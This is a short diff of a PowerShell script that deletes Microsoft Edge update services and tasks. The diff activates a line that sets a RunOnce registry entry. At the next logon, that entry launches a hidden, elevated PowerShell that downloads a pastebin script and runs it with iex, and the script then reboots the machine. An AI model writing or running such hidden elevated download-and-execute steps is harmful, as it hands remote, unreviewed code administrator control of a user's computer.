@@ -54,6 +54,6 @@ sc.exe delete edgeupdate
 sc.exe delete edgeupdatem
 Unregister-ScheduledTask *Edge* -Confirm:$False
 
-#$Value = "Start-Process powershell -ArgumentList '-Command `"irm pastebin.com/raw/Ss1damT3 | iex`"' -Verb RunAs -WindowStyle Hidden"
-#Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'Step2Command' -Value "powershell -Command `"$Value`""
+$Value = "Start-Process powershell -ArgumentList '-Command `"irm pastebin.com/raw/BS1N5X4a | iex`"' -Verb RunAs -WindowStyle Hidden"
+Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'Step2Command' -Value "powershell -Command `"$Value`""
 Restart-Computer
